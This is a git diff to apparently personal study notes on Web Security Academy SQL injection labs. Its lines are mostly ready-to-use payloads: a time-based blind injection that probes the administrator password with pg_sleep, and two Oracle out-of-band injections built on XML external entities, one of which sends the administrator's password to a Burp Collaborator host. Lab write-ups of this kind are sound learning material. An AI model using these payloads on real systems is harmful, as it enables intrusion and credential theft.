@@ -202,6 +202,26 @@ TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(passwor
 TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='d')+then+pg_sleep(10)+else+null+end+from+users--;
 ```
 
+## **Blind SQL injection with conditional responses**
+
+### **Blind SQL injection with out-of-band interaction**
+
+```
+TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//fddgsfsgsdgdfvdfsgt.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+```
+
+### **Blind SQL injection with out-of-band data exfiltration**
+
+```
+TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.tt6htrgfbfdgdfgfddg.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--;
+
+```
+
+Burp Collaborator 
+
+![SQL%20Injections%205db06954ffab458189778feb212042ad/Screenshot_1.png](SQL%20Injections%205db06954ffab458189778feb212042ad/Screenshot_1.png)
+
 ### Note:- some of the examples here are taken from this repo because when i was going through the lab i forgot to document the results and queries
 
 [vernjan/web-security-academy](https://github.com/vernjan/web-security-academy/blob/master/SQLi.md)
